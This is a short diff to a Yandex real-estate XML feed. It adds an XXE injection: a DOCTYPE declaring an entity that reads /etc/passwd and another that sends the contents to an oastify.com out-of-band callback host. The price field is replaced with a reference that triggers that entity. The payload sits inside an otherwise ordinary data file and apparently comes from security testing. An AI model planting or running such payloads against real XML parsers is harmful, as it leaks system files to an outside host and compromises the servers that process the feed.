@@ -1,4 +1,10 @@
-<?xml version="1.0" encoding="UTF-8"?> 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "udbhviqg54n4zscpzqia0f7ygpmgaayz.oastify.com/?%xxe;">
+]
+>
 <realty-feed xmlns="http://webmaster.yandex.ru/schemas/feed/realty/2010-06">
      <generation-date>2010-12-11T12:00:00+04:00</generation-date>   
 
@@ -25,7 +31,7 @@
   <phone>+74951234567</phone>
 </sales-agent>     
 <price>     
-  <value>400000</value>        
+  <value>&callhome;</value>        
   <currency>RUR</currency> 
 </price>
 <area>     
